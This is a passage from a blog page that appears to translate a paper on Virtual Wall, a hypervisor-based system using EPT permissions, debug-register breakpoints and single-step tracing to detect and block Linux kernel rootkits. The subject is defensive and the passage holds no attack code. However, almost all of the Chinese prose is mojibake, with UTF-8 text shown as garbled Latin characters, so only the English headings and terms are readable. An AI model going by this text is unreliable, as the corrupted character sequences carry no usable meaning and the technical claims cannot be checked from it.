rootkits å¯èƒ½åœ¨æ¨¡å—åŠ è½½é˜¶æ®µå¯åŠ¨ä¸€æ¬¡æ”»å‡»ï¼Œæˆ–æ˜¯åœ¨æ¨¡å—ä½äºå†…å­˜ä¸­çš„æ—¶é—´ä¸­çš„ä»»ä½•æ—¶é—´ã€‚è‹¥æ£€æµ‹åœ¨ LKM è¢«è½½å…¥åæˆ–è¢«ç§»é™¤åå®Œæˆï¼Œåˆ™æ£€æµ‹ç»“æœå¯èƒ½ä¸ç²¾ç¡®ï¼Œæµ™æ±Ÿå½±å“åç»­çš„æ£€æµ‹ä¸è¿½è¸ªã€‚å› æ­¤ï¼ŒVTW éœ€è¦åœ¨æ¨¡å—è½½å…¥å®Œæˆå‰æˆ–åœ¨å…¶ç”Ÿå‘½å‘¨æœŸä¸­æ£€æµ‹ rootkits çš„æœ‰å®³æ“ä½œä»¥ä¿æŠ¤å†…æ ¸æ•°æ®çš„å®Œæ•´æ€§ã€‚</p><p>2ï¼‰ <em>é«˜æ•ˆé˜²æŠ¤</em> ï¼ˆEffective Defenceï¼‰ã€‚rootkits æ“ä½œçš„å†…æ ¸å¯¹è±¡åŒ…æ‹¬é™æ€ä¸åŠ¨æ€çš„å†…æ ¸æ•°æ®ã€‚å¯¹äºé™æ€å†…æ ¸æ•°æ®ï¼ŒVTW éœ€è¦ç¡®è®¤ä»–ä»¬æœªè¢«ç¯¡æ”¹ã€‚å¯¹äºåŠ¨æ€å†…æ ¸æ•°æ®ï¼ŒVTW éœ€è¦ç¡®ä¿ä»–ä»¬åœ¨è¢«ç¯¡æ”¹åå¯ä»¥è¢«æ¢å¤ã€‚</p><p>3ï¼‰ <em>ç»¼åˆå¯è¿½è¸ªæ€§</em> ï¼ˆComprehensive Traceabilityï¼‰ã€‚æ”»å‡»ä»£ç å¯èƒ½åœ¨ rootkit æ‰€å±å†…å­˜ç©ºé—´ä¸­ï¼Œä¹Ÿå¯èƒ½åœ¨ rootkit æ‰€ä¾èµ–çš„å…¶ä»–æ¨¡å—çš„ä»£ç ç©ºé—´ä¸­ã€‚VTW éœ€è¦å®šä½æ‰€æœ‰ä¸å½“å‰æœ‰å®³æ“ä½œç›¸å…³çš„ LKMsã€‚</p><h2 id="3-3-System-Architecture-of-Virtual-Wall"><a href="#3-3-System-Architecture-of-Virtual-Wall" class="headerlink" title="3.3 System Architecture of Virtual Wall"></a>3.3 System Architecture of Virtual Wall</h2><p>VTW çš„é˜²æŠ¤è¿‡ç¨‹å¦‚ å›¾.1 æ‰€ç¤ºã€‚é˜²å¾¡æ¨¡å¼éœ€è¦é€šè¿‡åˆå§‹åŒ–æ¥å»ºç«‹ï¼Œä¹‹ååº”ç”¨è®¿é—®æ§åˆ¶æ–¹æ¡ˆï¼Œæœ€ååŒæ—¶è¿å¸¦å®Œæˆæ£€æµ‹ä¸è·Ÿè¸ªä»¥åœ¨ rootkit è¿‡æ»¤ä¸­è¿›è¡Œé«˜é€Ÿå†³å®šã€‚</p><p><img src="https://s2.loli.net/2023/04/06/XyHTQfdiP9YZk7S.png" alt="å›¾.1 virtual wall æ“ä½œè¿‡ç¨‹"></p><p>VTW çš„æ¶æ„å¦‚ å›¾.2 æ‰€ç¤ºã€‚VTW ç”± ModeHandlerã€MemHandlerã€ControlHandlerã€SPEï¼ˆSecurity Policy Engineï¼Œå®‰å…¨ç­–ç•¥å¼•æ“ï¼‰ç»„æˆã€‚ModeHandler çš„ä»»åŠ¡æ˜¯ç¡®ä¿åœ¨ â€œguestâ€ ä¸ â€œhostâ€ æ¨¡å¼ä¹‹é—´çš„æ­£å¸¸æ¨¡å¼åˆ‡æ¢ã€‚</p><p><img src="https://s2.loli.net/2023/04/06/ZrhVFxDmM3gERbI.png" alt="å›¾.2 VTW é˜²æŠ¤ç³»ç»Ÿæ¶æ„"></p><p>MemHandle çš„ä»»åŠ¡æ˜¯é€šè¿‡å»ºç«‹ä¸€ç»„ç‹¬ç«‹çš„åœ°å€é¡µè¡¨æ¥ä» â€œguestâ€ ä¸Šéš”ç¦»å®‰å…¨å†…å®¹ç‰©ã€‚æ­¤å¤–ï¼Œå…¶å€Ÿç”¨ EPT ï¼ˆè¯‘æ³¨ï¼šExtend Page Tableï¼Œæ‰©å±•é¡µè¡¨ï¼‰æ¥å®ç° VTW çš„è‡ªæˆ‘é˜²æŠ¤ä¸é€æ˜éƒ¨ç½²ã€‚ControlHandler å®Œæˆ rootkit çš„æ£€æµ‹ã€é¢„é˜²ã€åˆ†æã€‚</p><p>SPE ä¸ºæ¯ä¸ªå†…å®¹ç‰©æä¾›å®‰å…¨ç­–ç•¥ï¼Œä¾‹å¦‚ä¸ºé™æ€å†…æ ¸æ•°æ®æä¾›æƒé™è®¾ç½®ã€ä¸ºåŠ¨æ€å†…æ ¸æ•°æ®æä¾›åˆæ³•æ€§çº¦æŸã€ä¸ºæ§åˆ¶æµæä¾›è¿½è¸ªè·¯å¾„ã€‚æ‰€æœ‰å¯¹ SPE çš„æŸåéƒ½å°†å¯¼è‡´æ“ä½œç³»ç»Ÿä» â€œguestâ€ é™·å…¥ â€œhostâ€ã€‚</p><h3 id="3-3-1-Resetting-of-OSâ€™s-Privilege-Mode"><a href="#3-3-1-Resetting-of-OSâ€™s-Privilege-Mode" class="headerlink" title="3.3.1 Resetting of OSâ€™s Privilege Mode"></a>3.3.1 Resetting of OSâ€™s Privilege Mode</h3><p>ModeHandler ä½¿ç”¨ Intel VMX Non-Root ä¸ Intel VMX Root æ¥å°†åŸç”Ÿæ“ä½œç³»ç»Ÿåˆ†ä¸º â€œguestâ€ ä¸ â€œhostâ€ æ¨¡å¼ã€‚è¿™ä¸¤ç§æ¨¡å¼å°† ring0 åˆ†ä¸ºä¸¤ä¸ªç‰¹æƒçº§ï¼Œç§°ä¸ºå®Œå…¨å‹ ring0 ä¸é™åˆ¶å‹ ring0ã€‚åœ¨ â€œhostâ€ æ¨¡å¼ä¸‹ï¼ŒVTW ä½äºå®Œå…¨å‹ ring0 çº§ï¼Œå¯ä»¥å®Œå…¨æ¥ç®¡å†…æ ¸æ§åˆ¶æµã€‚åœ¨ â€œguestâ€ æ¨¡å¼ä¸‹ï¼Œå†…æ ¸ä½äºé™åˆ¶å‹ ring0 çº§ï¼Œä»»ä½•æŸå SPE çš„è¡Œä¸ºéƒ½å°†é€ æˆæ“ä½œç³»ç»Ÿé™·å…¥åˆ° â€œhostâ€ æ¨¡å¼ã€‚</p><p>åœ¨ å›¾.3 ä¸­ï¼ŒProtectionWallä¸º ModeHandler ä¸ MemHandler çš„åŠŸèƒ½å±æ€§çš„æŠ½è±¡ï¼ŒKernelProtector ä¸º ControlHandler çš„åŠŸèƒ½å±æ€§çš„æŠ½è±¡ã€‚</p><p>è‹¥ guest æ¨¡å¼ä¸‹çš„ä¸€æ¡æŒ‡ä»¤ä¼šæŸåå®‰å…¨ç­–ç•¥ï¼Œåˆ™å…¶å°†é€ æˆæ“ä½œç³»ç»Ÿåˆ‡æ¢åˆ° host æ¨¡å¼ã€‚ProtectionWall å°†æ‹’ç»æ‰€æœ‰åœ¨ guest æ¨¡å¼ä¸‹çš„æ“ä½œå¹¶å”¤é†’ KernelProtector ä½¿ç”¨ SPE å¤„ç†è¯¥æ”»å‡»ã€‚</p><p><img src="https://s2.loli.net/2023/04/06/Qt4skOVGPNJcLS2.png" alt="å›¾3. Linux å†…æ ¸æ“ä½œä¸­åœ¨ guest ä¸ host æ¨¡å¼é—´çš„æ¡ä»¶è·³è½¬"></p><h3 id="3-3-2-Creating-Private-Page-Tables"><a href="#3-3-2-Creating-Private-Page-Tables" class="headerlink" title="3.3.2 Creating Private Page Tables"></a>3.3.2 Creating Private Page Tables</h3><p>MemHandler ä¸º host åˆ›å»ºä¸€ç»„ç§æœ‰é¡µè¡¨ä»¥åˆ†å‰²ä¸¤ç§æ¨¡å¼çš„åœ°å€ç©ºé—´ï¼Œç§æœ‰é¡µè¡¨çš„åˆ›å»ºæ¡ä»¶å¦‚ è¡¨2 æ‰€ç¤ºã€‚</p><p>å­˜å‚¨ä¸å†…æ ¸æ•°æ®æ®µä¸­çš„å†…æ ¸æ•°æ® $swapper_pg_dir$ æŒ‡å‘å†…æ ¸åœ°å€ç©ºé—´çš„é¡µç›®å½•ï¼Œæ‰€æœ‰æ‰§è¡Œå®ä½“çš„å†…æ ¸åœ°å€ç©ºé—´åŸºäº $swapper_pg_dir$ æ„å»ºã€‚åœ¨ è¡¨2 ä¸­ï¼Œæ‰€æœ‰ç§æœ‰é¡µè¡¨ç»„æˆä¸€ä¸ªå…ƒç»„ $\rho$  ï¼Œä¸”æ‰€æœ‰ç”± $swapper_pg_dir$ æŒ‡å‘çš„é¡µè¡¨ç»„æˆä¸€ä¸ªå…ƒç»„ $\varepsilon$ ï¼ˆâ‘ ~â‘¡ï¼‰ã€‚</p><p>å½“ MemHandler è¢«åˆå§‹åŒ–ï¼Œå…¶ä¼šæ ¹æ® $\varepsilon$ åˆ›å»ºé¡µç›®å½•è¡¨ï¼ˆ$h_pml4e$ï¼‰ã€é¡µé¡¶çº§ç›®å½•ï¼ˆ$h_pdpte$ï¼‰ã€é¡µä¸­é—´ç›®å½•ï¼ˆ$h_pde$ï¼‰ã€é¡µè¡¨ï¼ˆ$h_pe$ï¼‰ã€‚</p><p>æˆ‘ä»¬é¦–å…ˆåŸºäºé¡µè¡¨é›† $\rho$ ï¼ˆâ‘¢ï¼‰çš„å†…å­˜ $V_{22}$ åˆ›å»ºä¸€ä»½ç­‰é‡çš„å†…å­˜ $V_{1}$ ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨æ¯ä¸ª $h_pdpte$ çš„ç‰©ç†å†…å­˜å¡«å…… $h_pml4e$ çš„æ¡ç›®ã€ä½¿ç”¨æ¯ä¸ª $h_pde$ çš„ç‰©ç†å†…å­˜å¡«å…… $h_pdpte$ çš„æ¡ç›®ã€ä½¿ç”¨æ¯ä¸ª $h_pe$ çš„ç‰©ç†å†…å­˜å¡«å…… $h_pde$ çš„æ¡ç›®ã€‚</p><p>æœ€åï¼ŒMemHandler æ‹·è´ $\varepsilon$ çš„æœ€åçš„é¡µè¡¨ä¸­æ‰€æœ‰çš„é¡µæ¡ç›®è‡³ $h_pe$ ã€‚å½“ â€œhostâ€ ä¸­å‡ºç°ä¸€ä¸ªé¡µè¡¨é”™è¯¯æ—¶ï¼ŒVTW æ ¹æ® $\varepsilon$ æ›´æ–°é”™è¯¯çš„é¡µè¡¨ã€‚</p><p>ä¸ºäº†ç¡®ä¿ VTW çš„é€æ˜æ€§ï¼ŒMenHandler å»ºç«‹äº†ä¸€ç§ EPT é‡å®šå‘æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä½¿å¾— VTW çš„å†…å®¹å¯¹ â€œguestâ€ è€Œè¨€æ˜¯ä¸å¯è§çš„ã€‚å…¶æ ¹æ® VTW çš„æ¯ä¸ªå†…å®¹ç‰©çš„ç‰©ç†å†…å­˜é‡å®šå‘ EPT çš„é¡µè¡¨é¡¹è‡³ä¸€ä¸ªè¢«è®¾ä¸ºå¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œï¼ˆâ‘§~â‘©ï¼‰çš„ç©ºé¡µã€‚å½“ â€œguestâ€ ä¸­çš„å®ä½“æƒ³è¦è®¿é—® VTW çš„ç‰©ç†å†…å­˜æ—¶ï¼Œè¢«è®¿é—®çš„å†…å­˜ä¸ºä¸€ä¸ª <em>â€œ$ä¼ªé¡µ$â€</em> ï¼ˆpseudo pageï¼‰ã€‚</p><p>ç”±äºæ•´ä¸ªå†…æ ¸å…±äº«ä¸€ä¸ªç›¸åŒçš„åœ°å€ç©ºé—´ï¼Œæ¯ä¸ªæ‰§è¡Œå®ä½“å¯ä»¥æ˜ å°„åŒ…æ‹¬ VTW åœ¨å†…çš„æ‰€æœ‰å†…æ ¸å†…å®¹ã€‚å› æ­¤ï¼ŒVTW ä¸éœ€è¦ä»»ä½•è¿‡ç¨‹ä¾¿èƒ½è¢«æ£€æµ‹ä¸åˆ†æã€‚è‹¥æˆ‘ä»¬ä»…ä»…åˆ é™¤äº†å¯»å€ VTW çš„ EPT æ¡ç›®ï¼Œåˆ™å½“ä¸€ä¸ªå®ä½“æ¢ç´¢å†…æ ¸åœ°å€ç©ºé—´æ—¶ï¼Œæ“ä½œç³»ç»Ÿå°†ä¸æ–­åœ°é™·å…¥ â€œhostâ€ã€‚</p><p>ä¸€æ–¹é¢ï¼Œé¢‘ç¹çš„é™·å…¥å°†å½±å“æ‰§è¡Œæ•ˆç‡ï¼›å¦ä¸€æ–¹é¢ï¼Œå¼‚å¸¸çš„å†…å­˜è®¿é—®æ—¶é—´ä¸ç©ºé—´å°†ä½¿å¾—æ”»å‡»è€…æ¨æ–­å‡º VTW çš„å­˜åœ¨ã€‚å°† VTW çš„æ‰€æœ‰åœ°å€ç©ºé—´é‡å®šå‘è‡³ä¼ªç‰©ç†é¡µé¢å¯ä»¥æ’é™¤ç”±å†…å­˜æ¢æµ‹é€ æˆçš„æ—¶é—´ä¸ç©ºé—´å¼‚å¸¸ï¼Œè¿™å¢å¼ºäº† VTW çš„é€æ˜æ€§ã€‚</p><h1 id="4-Resource-Access-Control"><a href="#4-Resource-Access-Control" class="headerlink" title="4 Resource Access Control"></a>4 Resource Access Control</h1><p>VTW é€šè¿‡ MemHandler æ§åˆ¶å†…å­˜è®¿é—®ã€‚MenHandler ä½¿ç”¨ EPT æ¥æ§åˆ¶ â€œguestâ€ æ¨¡å¼ä¸­çš„å†…å­˜è®¿é—®ã€‚é€šè¿‡ EPT æä¾›çš„å†…å­˜æƒé™ç®¡ç†ï¼Œæˆ‘ä»¬å¯ä»¥æ„ŸçŸ¥ã€è·Ÿè¸ªã€æ§åˆ¶ â€œguestâ€ å¯¹æ‰€æœ‰å†…å­˜é¡µé¢çš„è®¿é—®ã€‚MenHandler å¯ä»¥éå¸¸ç®€ä¾¿åœ°é€šè¿‡è®¾ç½® EPT æœ€åä¸€çº§çš„æƒé™ä½æ¥éƒ¨ç½²ã€‚</p><p>ä¸ºäº†è¾¾æˆå¯¹å†…æ ¸æ›´ç»†ç²’åº¦çš„è®¿é—®æ§åˆ¶ï¼ŒControlHandler å»ºç«‹äº†ä¸€ä¸ªåŒ…æ‹¬è®¾ç½®æ–­ç‚¹ã€æ³¨å…¥é€šç”¨ä¿æŠ¤å¼‚å¸¸ã€æ‰§è¡Œå•æ­¥è°ƒè¯•çš„äº‹ä»¶æ³¨å…¥æœºåˆ¶ã€‚æˆ‘ä»¬å°†åœ¨æœ¬èŠ‚æè¿°è¿™äº›ï¼Œå¹¶å±•ç¤ºäº è¡¨3 ä¸ â€œèµ„æºè®¿é—®æ§åˆ¶è¿‡ç¨‹â€ï¼ˆResource Access Control Procedureï¼‰ã€‚</p><h2 id="4-1-Conditioning-for-Resource-Access-Control"><a href="#4-1-Conditioning-for-Resource-Access-Control" class="headerlink" title="4.1 Conditioning for Resource Access Control"></a>4.1 Conditioning for Resource Access Control</h2><p>è¡¨3 ä¸ºè®¾ç½®èµ„æºè®¿é—®æ§åˆ¶çš„æ¡ä»¶ã€‚â‘ <del>â‘¨ç”¨äºè®¾ç½®æ–­ç‚¹ï¼Œæ–­ç‚¹çš„ç±»å‹å¯ä»¥ä¾æ®ç›®æ ‡å¯¹è±¡åˆ†ä¸ºæŒ‡ä»¤ä¸æ•°æ®æ–­ç‚¹ã€‚ControlHandler ä½¿ç”¨ Dr0</del>Dr3ï¼ˆæ–­ç‚¹åœ°å€å¯„å­˜å™¨äºé›†åˆ $DeReg$ ä¸­ï¼‰ä¸ DR6<del>DR7 ï¼ˆæ–­ç‚¹ç®¡ç†å¯„å­˜å™¨ï¼Œäºé›†åˆ $DeCon$ ä¸­ï¼‰æ¥è®¾ç½®ä¸åŒç±»å‹çš„æ–­ç‚¹ï¼ˆâ‘ </del>â‘¡ï¼‰ã€‚</p><p>åœ¨è®¾ç½®ä¸€ä¸ªæŒ‡ä»¤æ–­ç‚¹æ—¶ï¼Œé¦–å…ˆé€šè¿‡å‡½æ•° $SetDeReg$ å°†æŒ‡ä»¤åœ°å€ï¼ˆ $Iaddr$ ï¼‰å†™å…¥åˆ°æ–­ç‚¹åœ°å€å¯„å­˜å™¨ï¼ˆâ‘¢ï¼‰ï¼Œæ¥ä¸‹æ¥ Dr7 å¯¹åº”çš„ R&#x2F;W ä½è¢«è®¾ç½®ä¸º 01ï¼ˆæ•°æ®å†™ä¸­æ–­ï¼‰ï¼Œå¯¹åº”çš„ LEN ä½è¢«è®¾ç½®ä¸º 10 ï¼ˆæ•°æ®å¤§å°ä¸º 8 å­—èŠ‚ï¼‰ï¼Œå¦‚ â‘¦<del>â‘§æ‰€ç¤ºã€‚åœ¨å®Œæˆæ–­ç‚¹è®¾ç½®ä¹‹åï¼ŒControlHandler åŒæ ·éœ€è¦æ¸…é™¤ Dr6 ï¼ˆâ‘¨ï¼‰çš„ B0</del>B2 ï¼ˆä½ 2:0)ã€‚</p><p>ä¸ºäº†æ§åˆ¶ â€œguestâ€ çš„æ‰§è¡Œï¼ŒControlHandler ä¸ºæ“ä½œç³»ç»Ÿè®¾ç½®å•æ­¥æ‰§è¡Œè°ƒè¯•ã€‚ControlHandler é¦–å…ˆè¯»å– VMCS ä¸­ guest çŠ¶æ€åŸŸä¸­çš„ EFLAGS çš„å†…å®¹ï¼Œè®°å½•ç›®æ ‡ä¿¡æ¯ï¼ˆâ‘¬ï¼‰ã€‚æ¥ä¸‹æ¥å…¶å°† EFLAGS.TF ï¼ˆé™·é˜±æ ‡å¿—ä½ï¼‰è®¾ç½®ä¸º1ï¼ˆâ‘­ï¼‰ï¼Œè¿™å°†å¤„ç†å™¨è®¾ä¸ºå•æ­¥æ‰§è¡Œæ¨¡å¼ã€‚æœ€åï¼ŒControlHandler å°†ä¿®æ”¹åçš„å†…å®¹å†æ¬¡å†™å…¥ EFLAGSã€‚æœ€å Dr6 çš„ BSï¼ˆä½ 14ï¼‰è¢«è®¾ä¸º 0ã€‚</p><h2 id="4-2-Resource-Access-Control-Procedure"><a href="#4-2-Resource-Access-Control-Procedure" class="headerlink" title="4.2 Resource Access Control Procedure"></a>4.2 Resource Access Control Procedure</h2><p>è¯¥ç¨‹åºç”¨ä»¥æ§åˆ¶æŒ‡ä»¤æ‰§è¡Œä¸æ•°æ®è®¿é—®ã€‚æ­¥éª¤ 1<del>4ç”¨ä»¥è·å¾—æ–­ç‚¹ï¼Œæ­¥éª¤ 5</del>6 ç”¨ä»¥å µå¡ â€œguestâ€ ä¸­çš„ç›®æ ‡æŒ‡ä»¤ï¼Œæ­¥éª¤ 7~8 ç”¨ä»¥åœ¨æ‰§è¡Œç›®æ ‡æŒ‡ä»¤åè·å–æ“ä½œç³»ç»Ÿçš„çŠ¶æ€ã€‚</p><p><img src="https://s2.loli.net/2023/04/08/OVLpw5DtBHcr4PJ.png" alt="image.png"></p><p>å½“ä¸€ä¸ªæ‰§è¡Œå®ä½“åƒä¸€ä¸ªæ–­ç‚¹ä½ç½®å†™å…¥æ•°æ®ï¼ˆæ­¥éª¤1<del>2ï¼‰æˆ–æ˜¯åœ¨ â€œguestâ€ æ¨¡å¼ä¸‹æ‰§è¡Œä¸€ä¸ªæ–­ç‚¹æŒ‡ä»¤ï¼ˆæ­¥éª¤ 3</del>4ï¼‰ï¼Œå…¶ä¼šè§¦å‘åˆ° â€œhostâ€ æ¨¡å¼çš„æ¨¡å¼åˆ‡æ¢ï¼ˆ$SysMod$ï¼‰ã€‚Dr6 ä¸­çš„ B0 ~ B2 è¢«ç”¨ä»¥åŒºåˆ†æ–­ç‚¹çš„ä½ç½®ã€‚é€šè¿‡è®¾ç½®æ–­ç‚¹ï¼ŒVTW å®ç°äº†å­—èŠ‚çº§åˆ«çš„èµ„æºè®¿é—®ã€‚</p><p>å½“ä¸€ä¸ªé€šç”¨ä¿æŠ¤è¢«è®¾ç½®ï¼Œè¿è¡Œåœ¨ â€œguestâ€ æ¨¡å¼ä¸‹çš„æ“ä½œç³»ç»Ÿå°†ç”Ÿæˆä¸€ä¸ª #GP å¼‚å¸¸ï¼Œç”±æ­¤å½“å‰æ“ä½œå°†ä¼šè¢«é˜»å¡ï¼ˆæ­¥éª¤ 5~6ï¼‰ã€‚å½“å•æ­¥è°ƒè¯•å¯ç”¨ï¼Œæ“ä½œç³»ç»Ÿå°†åœ¨ â€œguestâ€ ä¸‹æ‰§è¡Œä»»æ„æŒ‡ä»¤åè§¦å‘ä¸€ä¸ªè°ƒè¯•å¼‚å¸¸å¹¶é™·å…¥åˆ° â€œhostâ€ ï¼ˆæ­¥éª¤ 7 ~ 8 ï¼‰ã€‚é€šè¿‡è®¾ç½®å•æ­¥è°ƒè¯•ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ºæ“ä½œç³»ç»Ÿå®ç°æŒ‡ä»¤ç²’åº¦çš„èµ„æºè®¿é—®æ§åˆ¶ï¼Œå¹¶é€šè¿‡ $get_status$ è·å¾—ç”±æ¯æ¡æŒ‡ä»¤æ‰€é€ æˆçš„å¯¹æ“ä½œç³»ç»ŸçŠ¶æ€çš„æ”¹å˜ã€‚</p><h1 id="5-Rootkit-Defense-Strategies"><a href="#5-Rootkit-Defense-Strategies" class="headerlink" title="5 Rootkit Defense Strategies"></a>5 Rootkit Defense Strategies</h1><p>æˆ‘ä»¬ä¾æ®æ”»å‡»æ—¶é—´å°†å†…æ ¸ rootkits çš„æ”»å‡»åˆ†ä¸ºä¸‰ç±»ã€‚ç¬¬ä¸€ç±»ä¸­ rootkits åœ¨åŠ è½½æ—¶æ”»å‡»å†…æ ¸ï¼Œå…¶ä¼šé€šè¿‡ $module_init()$ è°ƒç”¨ç‰¹å®šå‡½æ•°ä»¥å®ç°ä»–ä»¬çš„æ”»å‡»ã€‚</p><p>å†…æ ¸ rootkits çš„æœ‰å®³è¡Œä¸ºå¯èƒ½åœ¨ä»¥ä¸Šä¸‰ç±»æ”»å‡»ä¸­çš„å…¶ä¸€æˆ–æ•°ä¸ªä¸­å‡ºç°ï¼ŒåŒæ—¶ä¸å½“å‰æ”»å‡»æ‰€å…³è”çš„ rootkit(s) å¯èƒ½ä¼šæ˜¯æ­£åœ¨è¢«åŠ è½½çš„ LKMã€å·²åŠ è½½çš„ LKMï¼ŒæŠ‘æˆ–ä¸¤è€…éƒ½æ˜¯ã€‚</p><p>VTW å†³å®šä¸€ä¸ª LKM æ˜¯å¦ä¸ºä¸€ä¸ªå†…æ ¸ rootkitã€‚å¯¹äºå†…æ ¸ rootkitsï¼ŒVTW é€šè¿‡é˜»å¡ä»–ä»¬çš„ç ´åè¡Œä¸ºå¹¶æ¢å¤è¢«ç ´åçš„æ•°æ®æ¥å¯¹æŠ—ä»–ä»¬ã€‚rootkit æ£€æµ‹æ–¹æ³•å¦‚ â€œRootkit æ”»å‡»æ£€æµ‹â€ æ‰€ç¤ºï¼Œæ¡ä»¶è®¾ç½®å±•ç¤ºäº è¡¨4 ä¸­ã€‚è¯¥æ–¹æ³•å¯ä»¥è¢«ç”¨ä»¥é¢„æ£€æµ‹é™æ€ä¸åŠ¨æ€çš„å†…æ ¸å¯¹è±¡ã€‚</p><p><img src="https://s2.loli.net/2023/04/08/pX1lVcQrSfg5wiK.png" alt="image.png"></p><p><em>Rootkit æ”»å‡»æ£€æµ‹</em> ï¼ˆDetection of Rootkit Attacksï¼‰ã€‚å…¶è¢«ç”¨ä»¥æ£€æµ‹å†…æ ¸ rootkit å¹¶ä¿æŠ¤å†…æ ¸ä¸è¢«æ‘§æ¯ã€‚æ­¥éª¤ 1 ~ 5 ç”¨äºé™æ€å†…æ ¸å¯¹è±¡ä¿æŠ¤ï¼Œæ­¥éª¤ 6 ~ 8 ç”¨äºéšè—æ£€æµ‹ï¼Œæ­¥éª¤ 9 ~ 11 ç”¨äºåŠ¨æ€å†…æ ¸å¯¹è±¡ä¿æŠ¤ã€‚</p><p><img src="https://s2.loli.net/2023/04/08/PvFmjXe2TyQLi4K.png" alt="image.png"></p><h2 id="5-1-Static-Kernel-Object-Protection"><a href="#5-1-Static-Kernel-Object-Protection" class="headerlink" title="5.1 Static Kernel Object Protection"></a>5.1 Static Kernel Object Protection</h2><p>é™æ€å†…æ ¸å¯¹è±¡ï¼ˆ$\mu$ ä¸ $\xi$ï¼‰åœ¨æ“ä½œç³»ç»Ÿä¸­ä¿æŒä¸è¢«æ”¹å˜ã€‚ç‰¹å®šçš„å†…æ ¸æ§åˆ¶æµæ‰§è¡Œè·¯å¾„ä¸ä¸€äº›é‡è¦çš„æ•°æ®è¢«å­˜æ”¾äºé™æ€å†…æ ¸å¯¹è±¡ä¸­ã€‚å†…æ ¸ rootkits å¯ä»¥é€šè¿‡ç ´åé™æ€å†…æ ¸å¯¹è±¡çš„å®Œæ•´æ€§æ¥è¾¾æˆä»–ä»¬çš„æ¶æ„ç›®çš„ã€‚</p><p>ä¸ºäº†ä¿æŠ¤é™æ€å†…æ ¸å¯¹è±¡ï¼ˆå¦‚æ“ä½œç³»ç»Ÿä»£ç æ®µã€æ•°æ®æ®µã€ç³»ç»Ÿè°ƒç”¨è¡¨ç­‰ï¼‰ï¼ŒVTW é€šè¿‡åˆ†ææ–‡ä»¶ $â€System.mapâ€$ æˆ–ä»å†…æ ¸ä»£ç æ®µæå–ä»¥è·å¾—ä»–ä»¬çš„çº¿æ€§åœ°å€ï¼Œå¹¶å°†å…¶ç¿»è¯‘ä¸ºç‰©ç†åœ°å€ã€‚</p><p>ä¹‹åï¼ŒVTW è®¾ç½®æ ‡è¯†è¿™äº›ç‰©ç†åœ°å€çš„ EPT æ¡ç›®ï¼ˆ$\zeta$ï¼‰çš„å†™æƒé™ä¸º â€œä¸å¯å†™â€ï¼ˆè¡¨4 ä¸­çš„ â‘£ ~ â‘¤ï¼‰ã€‚åœ¨ â€œguestâ€ æ¨¡å¼ä¸­ï¼Œå¯¹é™æ€å†…æ ¸å¯¹è±¡çš„å†™æ“ä½œï¼ˆ$WriteTo$ï¼‰å°†è§¦å‘ â€œEPT violationâ€ é€ æˆæ“ä½œç³»ç»Ÿé™·å…¥åˆ° â€œhostâ€ ï¼ˆâ€œRootkit æ”»å‡»æ£€æµ‹â€ ä¸­çš„ æ­¥éª¤ 1ï¼‰ã€‚æ¥ä¸‹æ¥ï¼ŒVTW æ³¨å…¥ä¸€ä¸ª #GP å¼‚å¸¸ï¼ˆ$InjectGP$ï¼‰ åˆ° â€œguestâ€ ä¸­ä»¥é¢„é˜² LKM æ‘§æ¯å†…æ ¸æ•°æ®ï¼ˆæ­¥éª¤ 2ï¼‰ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯æœ€å°çš„å†…å­˜ä¿æŠ¤ç²’åº¦ä¸ºä¸€å¼  â€œé¡µâ€ã€‚ç„¶è€Œå¹¶éæ‰€æœ‰çš„é™æ€å†…æ ¸å¯¹è±¡éƒ½å ç”¨å®Œæ•°ä¸ªé¡µï¼Œå› æ­¤å½“ä¸€ä¸ª â€œEPT æŸåâ€ å¼‚å¸¸è¢«æŠ›å‡ºï¼ŒVTW é¦–å…ˆç¡®è®¤å¼‚å¸¸åœ°å€æ˜¯å¦å±äºè¢«ä¿æŠ¤å¯¹è±¡çš„åœ°å€èŒƒå›´ã€‚</p><p>è‹¥æ˜¯ï¼Œåˆ™å½“å‰æ“ä½œä¼šè¢«é˜»å¡ï¼Œè‹¥å¦ï¼Œåˆ™ VTW å°†è®¾ç½® â€œguestâ€ ä¸ºå•æ­¥æ‰§è¡Œæ¨¡å¼ï¼ˆæ­¥éª¤4 ä¸­çš„ $SingleStep$ ï¼‰ã€‚æ¥ä¸‹æ¥å…¶å°†é¡µè®¾ç½®ä¸º â€œå¯å†™çš„â€ ï¼ˆæ­¥éª¤ 5ï¼‰ã€‚æœ€å VTW å°†æ“ä½œç³»ç»Ÿåˆ‡æ¢å› â€œguestâ€ æ¨¡å¼ä»¥å®Œæˆåç»­çš„å†™å…¥ã€‚åœ¨è¿™ä¹‹åï¼Œæ“ä½œç³»ç»Ÿé‡æ–°é™·å…¥ â€œhostâ€ï¼ŒVTW é€šè¿‡å‡½æ•° $OpenWrite$ å°†é¡µæ¢å¤åˆ° â€œä¸å¯å†™â€ ã€‚</p><h2 id="5-2-Dynamic-Kernel-Object-Protection"><a href="#5-2-Dynamic-Kernel-Object-Protection" class="headerlink" title="5.2 Dynamic Kernel Object Protection"></a>5.2 Dynamic Kernel Object Protection</h2><p>å†…æ ¸ rootkits å¯ä»¥é€šè¿‡ç¯¡æ”¹åŠ¨æ€å†…æ ¸æ•°æ®æ¥è¾¾æˆå¦‚åŠ«æŒæ§åˆ¶æµçš„æ¶æ„ç›®çš„ã€‚è¢«ç¯¡æ”¹çš„å†…æ ¸æ•°æ®åŒ…æ‹¬æ§åˆ¶æ•°æ®ä¸éæ§åˆ¶æ•°æ®ï¼Œå‰è€…æŒ‡çš„æ˜¯æŒ‡å‘å†…æ ¸æ§åˆ¶æµçš„æŒ‡é’ˆã€‚</p><p>è¿™äº›æŒ‡é’ˆé€šå¸¸è¢«ç”¨äºæ„é€ è¯­ä¹‰è§†è§’ï¼Œä¾‹å¦‚å­˜å‚¨äº $â€procâ€$ æ–‡ä»¶ç³»ç»Ÿä¸­çš„å‡½æ•°æŒ‡é’ˆã€‚åè€…åˆ™æŒ‡æŸäº›çŠ¶æ€æè¿°ç¬¦ä¸­çš„ä¸€äº›æ¡ç›®ï¼Œå¦‚ $â€struct moduleâ€$ ä¸­çš„æ¡ç›® $â€prevâ€$ ä¸ $â€nextâ€$ã€‚</p><p>å®æ—¶æ›´æ–°çš„å†…æ ¸æ•°æ®ä¸è¢« rootkits 